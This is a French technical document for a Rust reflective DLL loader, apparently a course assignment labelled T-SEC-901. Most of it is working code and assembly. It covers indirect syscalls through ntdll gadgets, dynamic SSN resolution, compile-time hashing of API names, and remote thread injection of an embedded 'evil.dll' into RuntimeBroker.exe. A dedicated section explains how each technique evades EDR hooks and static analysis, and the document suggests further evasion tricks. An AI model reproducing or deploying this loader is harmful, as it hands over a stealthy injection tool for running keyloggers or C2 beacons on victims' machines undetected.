# Documentation Technique - Reflective DLL Loader (Rust)

## Table des Matières
1. [Vue d'Ensemble](#vue-densemble)
2. [Architecture Générale](#architecture-générale)
3. [Module Syscalls](#module-syscalls)
4. [Parsing PE](#parsing-pe)
5. [Injection Reflective](#injection-reflective)
6. [Concepts Rust Utilisés](#concepts-rust-utilisés)
7. [Flow d'Exécution](#flow-dexécution)
8. [Techniques Anti-EDR](#techniques-anti-edr)

---

## Vue d'Ensemble

### Objectif
Loader sophistiqué utilisant **indirect syscalls** pour injecter une DLL reflective dans un processus distant (RuntimeBroker.exe) via parsing PE manuel et résolution dynamique des SSN.

### Techniques Implémentées
- **Indirect Syscalls**: Appels système via gadgets ntdll.dll (contournement hooks EDR user-land)
- **SSN Resolution**: Résolution dynamique des System Service Numbers via parsing PEB
- **Reflective DLL Injection**: Injection d'une DLL qui se mappe elle-même en mémoire
- **PE Parsing**: Analyse manuelle du format PE pour localiser l'export `ReflectiveLoader`
- **Process Enumeration**: Énumération via `NtQuerySystemInformation` (pas d'API user-land)

---

## Architecture Générale

```
src/
├── main.rs                      # Point d'entrée, logique d'injection
└── syscalls/                    # Module de syscalls indirects
    ├── mod.rs                   # Exports du module
    ├── obf.rs                   # Obfuscation DJB2 (compile-time)
    ├── resolve.rs               # Résolution SSN via PEB
    └── syscall.rs               # Macro + assembleur x64
```

### Flux Global
```
main()
  → find_reflective_loader_offset()  [Parse PE]
  → find_process_pid()               [Enum processes]
  → inject_reflective_dll()          [7 syscalls indirects]
      → NtOpenProcess
      → NtAllocateVirtualMemory
      → NtWriteVirtualMemory
      → NtProtectVirtualMemory
      → NtCreateThreadEx
      → NtClose (x2)
```

---

## Module Syscalls

### 1. Obfuscation (obf.rs)

#### Hash DJB2
```rust
pub const fn djb2_hash(buffer: &[u8]) -> u32 {
    let mut hsh: u32 = 5381;
    // ...
    hsh = ((hsh << 5).wrapping_add(hsh)) + cur as u32;
}
```

**Concept Rust**: `const fn` - Fonction évaluée au **compile-time**
- Les noms de syscalls ("NtAllocateVirtualMemory") sont hashés à la compilation
- Le binaire final ne contient **que les hash**, pas les strings en clair
- Technique anti-analyse statique

**Exemple**:
```rust
obf!("NtAllocateVirtualMemory") // → 0xABCD1234 (compile-time)
```

#### Macro `obf!`
```rust
macro_rules! obf {
    ($s:expr) => {{
        static HASH: u32 = djb2_hash_str($s);
        HASH
    }};
}
```

**Concept Rust**: **Macro déclarative** (`macro_rules!`)
- Génère du code à la compilation
- `static HASH`: Variable statique initialisée au compile-time
- `$s:expr`: Capture une expression (la string)

---

### 2. Résolution SSN (resolve.rs)

#### Architecture PEB/LDR

Le PEB (Process Environment Block) contient la liste des DLLs chargées en mémoire:

```
TEB (Thread Environment Block)
 └─ ProcessEnvironmentBlock → PEB
     └─ Ldr → PEB_LDR_DATA
         └─ InLoadOrderModuleList → Liste chaînée de LDR_DATA_TABLE_ENTRY
             ├─ ntdll.dll
             ├─ kernel32.dll
             └─ ...
```

#### Lecture du TEB via GS Segment (x64)

```rust
pub unsafe fn __readgsqword(offset: u32) -> u64 {
    let out: u64;
    asm!(
        "mov {}, gs:[{:e}]",
        lateout(reg) out,
        in(reg) offset,
        options(nostack, pure, readonly),
    );
    out
}
```

**Concept Rust**: **Inline Assembly** (`asm!` macro)
- `gs:[offset]`: Segment GS contient le TEB sur Windows x64
- `lateout(reg)`: Contrainte - output dans un registre quelconque
- `in(reg)`: Input dans un registre
- `options(nostack)`: Ne touche pas à la stack
- `unsafe`: Requis pour l'assembleur inline

**Architecture Windows x64**:
- `gs:[0x30]`: Adresse du TEB
- `TEB+0x60`: Adresse du PEB

#### Parcours de la LDR (List des Modules)

```rust
fn get_module_addr(hash: ULONG) -> PVOID {
    unsafe {
        ldr = (*nt_current_peb()).Ldr;
        header = addr_of!((*ldr).InLoadOrderModuleList) as PLIST_ENTRY;
        entry = (*header).Flink;  // Flink = Forward Link (liste chaînée)

        while header as u64 != entry as u64 {
            dt_entry = entry as PLDR_DATA_TABLE_ENTRY;
            mod_name = slice::from_raw_parts(...);
            mod_hash = djb2_hash(mod_name);

            if mod_hash == hash {
                return (*dt_entry).DllBase;  // Adresse de base de ntdll.dll
            }
            entry = (*entry).Flink;  // Suivant
        }
    }
}
```

**Concept Rust**: **Raw Pointers** et **Unsafe**
- `*const T` / `*mut T`: Pointeurs bruts (pas de lifetime, pas de borrow checker)
- `addr_of!(expr)`: Prend l'adresse sans créer de référence temporaire
- `slice::from_raw_parts()`: Crée une slice à partir d'un pointeur + longueur
- `as PLDR_DATA_TABLE_ENTRY`: Cast de pointeur

**Structure Windows**:
```c
typedef struct _LDR_DATA_TABLE_ENTRY {
    LIST_ENTRY InLoadOrderLinks;        // Flink, Blink
    PVOID DllBase;                      // Adresse de base du module
    UNICODE_STRING BaseDllName;         // Nom du module (UTF-16)
    // ...
} LDR_DATA_TABLE_ENTRY;
```

#### Parsing de l'Export Table

```rust
fn get_function_addr(module_addr: PVOID, hash: u32) -> PVOID {
    dos_header = module_addr as PIMAGE_DOS_HEADER;
    nt_header = (dos_header as u64 + (*dos_header).e_lfanew as u64) as PIMAGE_NT_HEADERS;
    data_dir = addr_of!((*nt_header).OptionalHeader.DataDirectory[0]);

    exp_dir = (dos_header as u64 + (*data_dir).VirtualAddress as u64) as PIMAGE_EXPORT_DIRECTORY;

    // Trois tables parallèles:
    name_list = slice::from_raw_parts(addr_names as *const u32, num_names);  // RVA des noms
    ord_list  = slice::from_raw_parts(addr_ords as *const u16, num_names);   // Ordinals
    addr_list = slice::from_raw_parts(addr_funcs as *const u32, num_names);  // RVA des fonctions

    for iter in 0..num_names {
        str_addr = (dos_header as u64 + name_list[iter] as u64) as PUCHAR;
        if hash == djb2_hash(slice::from_raw_parts(str_addr, str_len)) {
            return (dos_header as u64 + addr_list[ord_list[iter] as usize] as u64) as PVOID;
        }
    }
}
```

**Format PE - Export Directory**:
```
Export Directory
├─ AddressOfFunctions   → [RVA1, RVA2, RVA3, ...]  (adresses fonctions)
├─ AddressOfNames       → [RVA1, RVA2, RVA3, ...]  (noms fonctions)
└─ AddressOfNameOrdinals→ [ORD1, ORD2, ORD3, ...]  (index dans AddressOfFunctions)
```

**Résolution**:
1. Chercher le nom dans `AddressOfNames` (via hash)
2. Récupérer l'ordinal correspondant dans `AddressOfNameOrdinals`
3. Utiliser l'ordinal comme index dans `AddressOfFunctions`
4. Convertir RVA en adresse absolue: `base_address + RVA`

#### Extraction du SSN

```rust
pub fn get_ssn(hash: u32) -> (u16, u64) {
    ntdll_addr = get_module_addr(obf!("ntdll.dll"));
    funct_addr = get_function_addr(ntdll_addr, hash);

    unsafe {
        // Désassemblage du prologue de la fonction NT
        // Bytecode typique:
        //   4C 8B D1              mov r10, rcx
        //   B8 XX 00 00 00        mov eax, SSN    <- SSN à offset +4
        //   ...
        ssn = *((funct_addr as u64 + 4) as *const u16);
    }

    ssn_addr = funct_addr as u64 + 0x12;  // Offset du "syscall; ret"

    (ssn, ssn_addr)
}
```

**Prologue d'une fonction NT dans ntdll.dll** (x64):
```asm
+0x00:  4C 8B D1              mov r10, rcx        ; Backup 1er arg
+0x03:  B8 [XX 00] 00 00      mov eax, [SSN]      ; SSN = Service Number
+0x08:  F6 04 25 08 03 FE 7F  test byte ptr [SharedUserData+0x308], 1
+0x0F:  01 75 03              jne short +3
+0x12:  0F 05                 syscall             ; <- Gadget ici
+0x14:  C3                    ret
```

**Concept**: On extrait le SSN (2 bytes à offset +4) et l'adresse du gadget `syscall; ret` (offset +0x12)

---

### 3. Macro Syscall (syscall.rs)

#### Macro `syscall!`

```rust
macro_rules! syscall {
    ($function_name:expr, $($y:expr), +) => {{
        let (ssn, addr) = get_ssn(obf!($function_name));
        let mut cnt: u32 = 0;
        $(
            let _ = $y;
            cnt += 1;
        )+
        do_syscall(ssn, addr, cnt, $($y), +)
    }}
}
```

**Concepts Rust**:
- `$($y:expr), +`: Répétition variadique (1 ou plus)
- `$(... )+`: Bloc répété pour chaque argument
- `cnt += 1`: Compte le nombre d'arguments
- Expansion à la compilation

**Exemple d'expansion**:
```rust
syscall!("NtClose", handle);

// Devient:
{
    let (ssn, addr) = get_ssn(obf!("NtClose"));
    let mut cnt: u32 = 0;
    let _ = handle;
    cnt += 1;
    do_syscall(ssn, addr, cnt, handle)
}
```

#### Code Assembleur Indirect Syscall

```asm
do_syscall:
    ; Arguments Windows x64 calling convention:
    ;   rcx = SSN
    ;   rdx = adresse gadget
    ;   r8  = nombre d'args
    ;   r9  = 1er arg syscall
    ;   [rsp+0x28] = 2ème arg
    ;   [rsp+0x30] = 3ème arg
    ;   etc.

    mov [rsp - 0x8],  rsi       ; Sauvegarder registres non-volatiles
    mov [rsp - 0x10], rdi
    mov [rsp - 0x18], r12

    mov eax, ecx                ; SSN dans eax (requis par syscall)
    mov r12, rdx                ; Gadget dans r12 (sauvegarde)
    mov rcx, r8                 ; Nombre d'args

    ; Préparer les 4 premiers args selon calling convention syscall
    mov r10, r9                 ; 1er arg: rcx → r10 (convention NT)
    mov rdx, [rsp + 0x28]       ; 2ème arg
    mov r8,  [rsp + 0x30]       ; 3ème arg
    mov r9,  [rsp + 0x38]       ; 4ème arg

    ; Copier les args supplémentaires (5+) sur la stack
    sub rcx, 0x4                ; Soustraire les 4 premiers args
    jle skip                    ; Si ≤ 0, skip

    lea rsi, [rsp + 0x40]       ; Source: args 5+
    lea rdi, [rsp + 0x28]       ; Dest: stack
    rep movsq                   ; Copier (rcx * 8 bytes)

skip:
    mov rcx, r12                ; Restaurer adresse gadget

    mov rsi, [rsp - 0x8]        ; Restaurer registres
    mov rdi, [rsp - 0x10]
    mov r12, [rsp - 0x18]

    jmp rcx                     ; Jump indirect vers "syscall; ret" dans ntdll.dll
```

**Concept Rust**: `global_asm!`
- Assembleur inline au niveau module (pas fonction)
- Code compilé tel quel dans le binaire
- Lié via `extern "C" { fn do_syscall(...); }`

**Calling Convention NT Syscalls**:
- `eax`: SSN (System Service Number)
- `r10`: 1er argument (normalement rcx, mais mov r10, rcx)
- `rdx`, `r8`, `r9`: Args 2, 3, 4
- Stack: Args 5+

**Technique Indirect Syscall**:
Au lieu d'exécuter `syscall` directement, on **jump vers un gadget légitime** dans ntdll.dll :
```
Notre code → jmp [adresse ntdll+0x12] → syscall; ret
```

**Avantage**: Le call stack montre ntdll.dll, pas notre code → contournement hooks EDR

---

## Parsing PE

### Format PE (Portable Executable)

```
+0x0000: DOS Header (MZ)
   ├─ e_magic: 0x5A4D ("MZ")
   └─ e_lfanew: Offset vers NT Headers

+e_lfanew: NT Headers (PE)
   ├─ Signature: 0x4550 ("PE")
   ├─ File Header (nombre de sections, etc.)
   └─ Optional Header
       └─ DataDirectory[0]: Export Directory
           ├─ VirtualAddress (RVA)
           └─ Size

Export Directory:
   ├─ NumberOfNames
   ├─ AddressOfFunctions   (RVA)
   ├─ AddressOfNames       (RVA)
   └─ AddressOfNameOrdinals (RVA)
```

### Code de Parsing

```rust
fn find_reflective_loader_offset(dll_bytes: &[u8]) -> Result<usize, String> {
    // 1. Lire DOS Header
    let dos_header = unsafe { &*(dll_bytes.as_ptr() as *const DosHeader) };
    if dos_header.e_magic != 0x5A4D {  // "MZ"
        return Err("Invalid DOS signature");
    }

    // 2. Lire NT Headers
    let nt_headers = unsafe {
        &*(dll_bytes.as_ptr().add(dos_header.e_lfanew as usize) as *const NtHeaders64)
    };
    if nt_headers.signature != 0x4550 {  // "PE"
        return Err("Invalid PE signature");
    }

    // 3. Export Directory RVA
    let export_dir_rva = nt_headers.optional_header.data_directory[0].virtual_address;

    // 4. Convertir RVA → File Offset
    let export_dir_offset = rva_to_file_offset(dll_bytes, export_dir_rva)?;

    // 5. Lire Export Directory
    let export_dir = unsafe {
        &*(dll_bytes.as_ptr().add(export_dir_offset) as *const ExportDirectory)
    };

    // 6. Parser les tables d'exports
    let names_rva_offset = rva_to_file_offset(dll_bytes, export_dir.address_of_names)?;
    let ordinals_offset = rva_to_file_offset(dll_bytes, export_dir.address_of_name_ordinals)?;
    let functions_offset = rva_to_file_offset(dll_bytes, export_dir.address_of_functions)?;

    // 7. Chercher "ReflectiveLoader"
    for i in 0..export_dir.number_of_names {
        let name_rva = read_u32(dll_bytes, names_rva_offset + i * 4);
        let name_offset = rva_to_file_offset(dll_bytes, name_rva)?;
        let name = read_cstring(dll_bytes, name_offset);

        if name == "ReflectiveLoader" {
            let ordinal = read_u16(dll_bytes, ordinals_offset + i * 2);
            let func_rva = read_u32(dll_bytes, functions_offset + ordinal as usize * 4);
            return rva_to_file_offset(dll_bytes, func_rva);
        }
    }

    Err("ReflectiveLoader not found")
}
```

**Concept Rust**: `&[u8]` - Slice
- `dll_bytes.as_ptr()`: Pointeur vers le début du buffer
- `.add(offset)`: Arithmétique de pointeur
- `as *const T`: Cast vers un type structuré
- `&*`: Déréférence puis référence (unsafe → safe)

### Conversion RVA → File Offset

```rust
fn rva_to_file_offset(dll_bytes: &[u8], rva: u32) -> Result<usize, String> {
    let nt_headers = ...;
    let sections_offset = dos_header.e_lfanew as usize + ... ;

    for i in 0..nt_headers.file_header.number_of_sections {
        let section = unsafe {
            &*(dll_bytes.as_ptr().add(sections_offset + i * size_of::<SectionHeader>())
                as *const SectionHeader)
        };

        if rva >= section.virtual_address
            && rva < section.virtual_address + section.virtual_size
        {
            return Ok((rva - section.virtual_address + section.pointer_to_raw_data) as usize);
        }
    }

    Err("RVA not in any section")
}
```

**Concept**: Les RVA (Relative Virtual Address) sont relatives à l'adresse de chargement en mémoire. Les sections mappent les RVA → file offsets.

---

## Injection Reflective

### Énumération de Processus

```rust
fn find_process_pid(target_name: &str) -> Option<u32> {
    unsafe {
        let buffer_size: u32 = 1024 * 1024;  // 1MB buffer
        let mut buffer: Vec<u8> = vec![0; buffer_size as usize];

        // Syscall indirect NtQuerySystemInformation
        let status: i32 = syscall!(
            "NtQuerySystemInformation",
            SystemProcessInformation as u32,  // Information Class = 5
            buffer.as_mut_ptr() as *mut c_void,
            buffer_size,
            &mut return_length as *mut u32
        );

        // Parser la liste chaînée SYSTEM_PROCESS_INFORMATION
        let mut offset = 0usize;
        loop {
            let entry = &*(buffer.as_ptr().add(offset) as PSYSTEM_PROCESS_INFORMATION);

            // Comparer le nom (UNICODE_STRING)
            if !entry.ImageName.Buffer.is_null() {
                let name_slice = slice::from_raw_parts(
                    entry.ImageName.Buffer,
                    (entry.ImageName.Length / 2) as usize  // UTF-16 → diviser par 2
                );
                let name = String::from_utf16_lossy(name_slice);

                if name.to_lowercase() == target_name.to_lowercase() {
                    return Some(entry.UniqueProcessId as u32);
                }
            }

            // NextEntryOffset = 0 → fin de liste
            if entry.NextEntryOffset == 0 {
                break;
            }
            offset += entry.NextEntryOffset as usize;
        }

        None
    }
}
```

**Structure SYSTEM_PROCESS_INFORMATION**:
```c
typedef struct _SYSTEM_PROCESS_INFORMATION {
    ULONG NextEntryOffset;      // Offset vers le suivant (liste chaînée)
    ULONG NumberOfThreads;
    // ...
    UNICODE_STRING ImageName;   // Nom du processus (UTF-16)
    HANDLE UniqueProcessId;     // PID
    // ...
} SYSTEM_PROCESS_INFORMATION;
```

**Concept Rust**: `Vec<u8>`
- `vec![0; size]`: Alloue un buffer initialisé à zéro
- `as_mut_ptr()`: Pointeur mutable vers le début
- Ownership: `Vec` possède la mémoire, sera libérée automatiquement

### Injection (7 Syscalls)

```rust
fn inject_reflective_dll(target_pid: u32, dll_bytes: &[u8], loader_offset: usize)
    -> Result<(), String>
{
    unsafe {
        // 1. NtOpenProcess - Ouvrir handle sur le processus cible
        let mut h_process: HANDLE = null_mut();
        let mut client_id = CLIENT_ID {
            UniqueProcess: target_pid as HANDLE,
            UniqueThread: null_mut(),
        };

        syscall!(
            "NtOpenProcess",
            &mut h_process,
            MINIMUM_ACCESS,  // 0x002A (droits minimum requis)
            &mut obj_attr,
            &mut client_id
        );

        // 2. NtAllocateVirtualMemory - Allouer mémoire RW dans le processus
        let mut base_address: *mut c_void = null_mut();
        let mut region_size: usize = dll_bytes.len();

        syscall!(
            "NtAllocateVirtualMemory",
            h_process,
            &mut base_address,  // OUT: ntdll choisit l'adresse
            0usize,             // ZeroBits (pas de contrainte)
            &mut region_size,
            MEM_COMMIT_RESERVE,  // 0x3000 (MEM_COMMIT | MEM_RESERVE)
            PAGE_READWRITE       // 0x04
        );

        // 3. NtWriteVirtualMemory - Copier la DLL dans la mémoire cible
        syscall!(
            "NtWriteVirtualMemory",
            h_process,
            base_address,
            dll_bytes.as_ptr() as *const c_void,
            dll_bytes.len(),
            &mut bytes_written
        );

        // 4. NtProtectVirtualMemory - Changer permission RW → RX
        let mut protect_addr = base_address;
        let mut protect_size = dll_bytes.len();

        syscall!(
            "NtProtectVirtualMemory",
            h_process,
            &mut protect_addr,
            &mut protect_size,
            PAGE_EXECUTE_READ,  // 0x20
            &mut old_protect
        );

        // 5. Calculer l'adresse du ReflectiveLoader
        let loader_address = (base_address as usize + loader_offset) as *mut c_void;

        // 6. NtCreateThreadEx - Créer thread distant
        let mut thread_handle: HANDLE = null_mut();

        syscall!(
            "NtCreateThreadEx",
            &mut thread_handle,
            0x1FFFFFu32,          // THREAD_ALL_ACCESS
            NULL,                 // ObjectAttributes
            h_process,
            loader_address,       // StartRoutine = ReflectiveLoader
            base_address,         // Argument = adresse DLL
            0u32,                 // CreateFlags
            0usize, 0usize, 0usize, NULL  // Paramètres optionnels
        );

        // 7. NtClose - Cleanup
        syscall!("NtClose", h_process);
        syscall!("NtClose", thread_handle);

        Ok(())
    }
}
```

**Flow Reflective DLL**:
```
1. DLL copiée en mémoire → RW
2. Permission changée → RX
3. Thread créé → entry point = ReflectiveLoader (export de la DLL)
4. ReflectiveLoader s'exécute:
   - Parse son propre PE en mémoire
   - Résout ses imports
   - Relocalise son code
   - Appelle DllMain
   - Le payload s'exécute
```

**Avantage**: La DLL se mappe elle-même, pas besoin de `LoadLibrary` (API hookée par les EDR)

---

## Concepts Rust Utilisés

### 1. Unsafe Rust

```rust
unsafe {
    let ptr = dll_bytes.as_ptr() as *const DosHeader;
    let dos = &*ptr;  // Déréférence unsafe
}
```

**Pourquoi unsafe ?**
- Déréférencement de raw pointers
- Appel de fonctions FFI (Foreign Function Interface)
- Assembleur inline
- Violation des garanties de sécurité mémoire

**Garanties perdues**:
- Pas de vérification de validité des pointeurs
- Pas de vérification de lifetime
- Pas de vérification de data race

### 2. FFI (Foreign Function Interface)

```rust
extern "C" {
    pub fn do_syscall(ssn: u16, syscall_addr: u64, n_args: u32, ...) -> i32;
}
```

**Concept**: Interface avec du code non-Rust (assembleur ici)
- `extern "C"`: Utilise la calling convention C
- Arguments variadiques `...`: Nombre variable d'arguments
- ABI (Application Binary Interface) doit correspondre

### 3. Raw Pointers

```rust
let ptr: *const u8 = dll_bytes.as_ptr();
let mut_ptr: *mut u8 = buffer.as_mut_ptr();
```

**Types**:
- `*const T`: Pointeur immutable (équivalent C: `const T*`)
- `*mut T`: Pointeur mutable (équivalent C: `T*`)

**Opérations**:
- `.add(offset)`: Arithmétique de pointeur
- `as *const T`: Cast de type
- `&*ptr`: Déréférence puis référence (unsafe → safe)

### 4. Macros

#### Macro Déclarative
```rust
macro_rules! syscall {
    ($name:expr, $($arg:expr), +) => {{ ... }};
}
```

**Patterns**:
- `$name:expr`: Capture une expression
- `$($arg:expr), +`: Répétition (1 ou +)
- `{{...}}`: Bloc d'expansion

#### Macro Procédurale (global_asm!)
```rust
global_asm!("
    mov eax, ecx
    syscall
");
```

**Différence**: Code assembleur intégré tel quel dans le binaire

### 5. Slices

```rust
let slice: &[u8] = &dll_bytes[offset..offset+size];
let slice2 = slice::from_raw_parts(ptr, len);
```

**Concept**: Vue sur un tableau contigü
- `&[T]`: Référence + longueur
- Pas de copie, juste un "window"
- Bounds checking à l'exécution (sauf from_raw_parts)

### 6. Pattern Matching

```rust
match find_process_pid("RuntimeBroker.exe") {
    Some(pid) => println!("Found PID: {}", pid),
    None => return Err("Process not found"),
}
```

**Concept**: Destructuration exhaustive
- `Some(T)` / `None`: Enum `Option<T>`
- Compilateur force à gérer tous les cas

### 7. Result et Error Handling

```rust
fn inject_reflective_dll(...) -> Result<(), String> {
    if status != 0 {
        return Err(format!("NtOpenProcess failed: {:#X}", status));
    }
    Ok(())
}
```

**Concept**: Pas d'exceptions, erreurs explicites
- `Result<T, E>`: Soit `Ok(T)`, soit `Err(E)`
- `?` operator: Propagation d'erreur automatique

### 8. Ownership et Borrowing

```rust
fn inject_reflective_dll(target_pid: u32, dll_bytes: &[u8], loader_offset: usize)
```

**Règles**:
- `target_pid: u32`: Copié (type primitif)
- `dll_bytes: &[u8]`: **Emprunté** (borrow) - pas de copie, juste référence
- Propriétaire original conserve l'ownership
- Garantit pas d'utilisation après libération

---

## Flow d'Exécution

### 1. Initialisation (main)

```rust
fn main() {
    const DLL_BYTES: &[u8] = include_bytes!("../../reflective_dll/evil.dll");
```

**Concept**: `include_bytes!`
- Macro compile-time
- Lit le fichier et l'intègre dans le binaire
- La DLL est **embeddée** dans l'executable

### 2. Parse PE (find_reflective_loader_offset)

```
DOS Header (0x00) → e_lfanew
   ↓
NT Headers (e_lfanew) → OptionalHeader.DataDirectory[0]
   ↓
Export Directory → AddressOfNames, AddressOfFunctions, AddressOfNameOrdinals
   ↓
Itération sur les noms → Hash comparison
   ↓
"ReflectiveLoader" trouvé → RVA → File Offset
```

### 3. Énumération (find_process_pid)

```
syscall!("NtQuerySystemInformation", ...)
   ↓
Kernel remplit buffer avec liste de SYSTEM_PROCESS_INFORMATION
   ↓
Parsing liste chaînée (NextEntryOffset)
   ↓
Comparaison ImageName (UTF-16) avec "runtimebroker.exe"
   ↓
Retourne UniqueProcessId (PID)
```

### 4. Injection (inject_reflective_dll)

```
NtOpenProcess(PID) → h_process
   ↓
NtAllocateVirtualMemory(h_process, RW, size=DLL_size) → base_address
   ↓
NtWriteVirtualMemory(h_process, base_address, DLL_BYTES, size)
   ↓
NtProtectVirtualMemory(base_address, RW → RX)
   ↓
loader_address = base_address + loader_offset
   ↓
NtCreateThreadEx(h_process, entry=loader_address, arg=base_address) → thread_handle
   ↓
NtClose(h_process)
NtClose(thread_handle)
```

### 5. Exécution dans la Cible

```
Thread démarre à loader_address (ReflectiveLoader)
   ↓
ReflectiveLoader (code C++ dans la DLL):
   - Parse PE de la DLL en mémoire
   - Mappe les sections
   - Résout les imports (GetProcAddress via PEB)
   - Applique les relocations
   - Appelle DllMain(DLL_PROCESS_ATTACH)
   ↓
Payload s'exécute (keylogger, beacon C2, etc.)
```

---

## Techniques Anti-EDR

### 1. Indirect Syscalls

**Problème**: EDRs hookent les fonctions ntdll.dll en user-land
```
Votre code → NtAllocateVirtualMemory → [HOOK EDR] → syscall
                                             ↓
                                        Détection
```

**Solution**: Jump vers le gadget `syscall; ret` directement
```
Votre code → do_syscall → jmp [ntdll+0x12] → syscall; ret
                                                ↓
                                              Kernel
```

**Call Stack vu par l'EDR**:
```
ntdll.dll!NtAllocateVirtualMemory+0x12
ntdll.dll!<quelquepart>
votre_loader.exe!inject_reflective_dll
```

L'EDR voit un appel depuis ntdll.dll → **Légitime**

### 2. Résolution SSN Dynamique

**Problème**: SSN changent selon la version de Windows
- Windows 10 21H1: NtAllocateVirtualMemory = SSN 0x18
- Windows 11 22H2: NtAllocateVirtualMemory = SSN 0x1A

**Solution**: Parser ntdll.dll au runtime → extraire SSN
- Compatible toutes versions Windows
- Pas de SSN hardcodés dans le binaire

### 3. Obfuscation des Noms

**Problème**: Strings "NtAllocateVirtualMemory" visibles dans le binaire

**Solution**: Hash DJB2 compile-time
```rust
obf!("NtAllocateVirtualMemory") → 0x1A2B3C4D (compile-time)
```

**Résultat**: Aucune string suspecte dans le binaire final

### 4. Pas d'Imports Suspects

**Imports typiques d'un malware**:
- `VirtualAllocEx` (allocation mémoire remote)
- `WriteProcessMemory` (écriture remote)
- `CreateRemoteThread` (thread remote)

**Imports de notre loader**:
```
AUCUN import user-land API
```

Toutes les APIs sont remplacées par des syscalls directs.

### 5. Droits Processus Minimum

```rust
const MINIMUM_ACCESS: u32 = 0x002A;
// = PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE
```

**Avantage**: Moins suspect que `PROCESS_ALL_ACCESS` (0x1F0FFF)

### 6. Reflective Loading

**Problème**: `LoadLibrary` est hookée par les EDRs

**Solution**: La DLL se mappe elle-même
- Pas d'appel à `LoadLibrary` ou `LdrLoadDll`
- La DLL n'apparaît pas dans la liste des modules (PEB)

---

## Compilation et Optimisation

### Profile Release

```toml
[profile.release]
opt-level = "z"      # Optimisation taille minimale
lto = true           # Link Time Optimization (inlining agressif)
panic = "abort"      # Pas de stack unwinding (plus petit)
strip = true         # Suppression des symboles debug
codegen-units = 1    # Optimisation inter-modules
```

**Résultat**: ~1.1 MB (non strippé), ~50-100KB potentiel après UPX

### Build Command

```bash
cargo build --release --target x86_64-pc-windows-gnu
```

**Target**: Windows 64-bit (MinGW toolchain pour cross-compilation depuis macOS/Linux)

---

## Limites et Considérations

### Détections Possibles

1. **Behavioral Analysis**: EDR kernel-mode peut détecter:
   - Syscalls inhabituels depuis user-mode
   - Injection de code (même via syscalls)
   - Protection RWX → RX → Création thread

2. **Heuristiques**:
   - Processus créant un thread dans un autre processus
   - Patterns de syscalls suspects

3. **AMSI (Antimalware Scan Interface)**:
   - Peut scanner la DLL avant/après injection

### Mitigations Additionnelles

1. **Sleep/Jitter**: Délais aléatoires entre syscalls
2. **PPID Spoofing**: Falsifier le parent process ID
3. **Module Stomping**: Écraser une DLL légitime au lieu d'allouer
4. **Thread Hijacking**: Hijacker un thread existant au lieu d'en créer un

---

## Conclusion

Ce loader démontre plusieurs techniques avancées:
- ✅ Syscalls indirects via gadgets ntdll.dll
- ✅ Résolution SSN dynamique via parsing PEB
- ✅ Obfuscation compile-time (hash DJB2)
- ✅ Reflective DLL injection
- ✅ Parsing PE manuel
- ✅ Zero imports suspects

**Concepts Rust maîtrisés**:
- Unsafe Rust (raw pointers, FFI)
- Inline assembly (global_asm!)
- Macros déclaratives (obf!, syscall!)
- Ownership et borrowing
- Error handling (Result<T, E>)

**Alignement T-SEC-901**:
- Implémentation from scratch ✅
- Stealth maximal ✅
- Résilience (SSN dynamiques) ✅
- Commande "syscall" ✅
